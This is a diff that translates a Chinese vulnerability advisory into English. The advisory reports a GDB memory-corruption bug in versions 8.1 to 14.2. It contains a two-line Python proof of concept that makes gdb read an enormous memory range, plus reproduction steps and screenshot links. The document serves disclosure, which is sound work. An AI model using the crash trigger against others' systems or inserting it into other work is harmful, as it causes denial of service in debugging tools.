@@ -1,50 +1,54 @@
+## Exploit **GDB 8.1~14.2 memory corruption** 
 
-## 利用 **GDB 8.1~14.2 内存损坏漏洞**
+Google Dork:gdb, memory leak, memory exhausted.
 
-Google Dork: gdb, 内存泄漏, 内存耗尽，内存越界.
+Date: 2024.4.2
 
-日期: 2024.4.2
+Exploit Author: N1nEmAn
 
-漏洞作者: N1nEmAn
+Vendor Homepage: https://www.sourceware.org/gdb
 
-供应商主页: https://www.sourceware.org/gdb
+Software Link: https://sourceware.org/pub/gdb/releases/
 
-软件链接: https://sourceware.org/pub/gdb/releases/
+Version: 8.1~14.2  (currently known, and possibly more)
 
-版本: 8.1~14.2 (目前已知，可能还有更多)
-
-测试环境: Ubuntu18.02、archlinux-2024
+Tested on: Ubuntu18.02、archlinux-2024
 
 ## POC
 
-保存为 `poc.py`，使用 `source /path/to/poc.py`。
+Save as `poc.py` and use `source /path/to/poc.py`.
 
 ```py
 import gdb
 gdb.selected_inferior().read_memory(0, 18446744073709551615)
 ```
 
-## 漏洞重现
+## Vulnerability Reproduction
 
-我们在最新的 GDB (14.2) 中利用了这个漏洞，以下是我的操作系统的详细信息:
+We exploited this in the newest GDB (14.2), and here are the details of my operating system:
 
 ```sh
-操作系统: Arch Linux x86_64
-内核: 6.8.2-zen2-1-zen
-内存: 9998MiB / 27746MiB
+OS: Arch Linux x86_64
+Kernel: 6.8.2-zen2-1-zen
+Memory: 9998MiB / 27746MiB
 CPU: AMD Ryzen 7 6800H with Radeon Graphics
 GPU: AMD ATI Radeon 680M
 ```
 
-### 1.加载任意二进制文件#
+### 1.load any binary file
 
-### 2.运行它并使用Ctrl+C停止
-![image-20240402211541005][]
-### 3.执行source poc.py
-![image-20240402211613585][]
-![image-20240402212709525][]
-### 4.在Ubuntu中
-![image-20240402212845142][]
-<!--stackedit_data:
-eyJoaXN0b3J5IjpbMTkyMjI5MjM5N119
--->
+![image-20240402211432774](./1.png)
+
+### 2.run it and ctrl+c to stop it
+
+![image-20240402211541005](./2.png)
+
+### 3. source poc.py
+
+![image-20240402211613585](./3.png)
+
+![image-20240402212709525](./4.png)
+
+### 4. in Ubuntu
+
+![image-20240402212845142](./5.png)
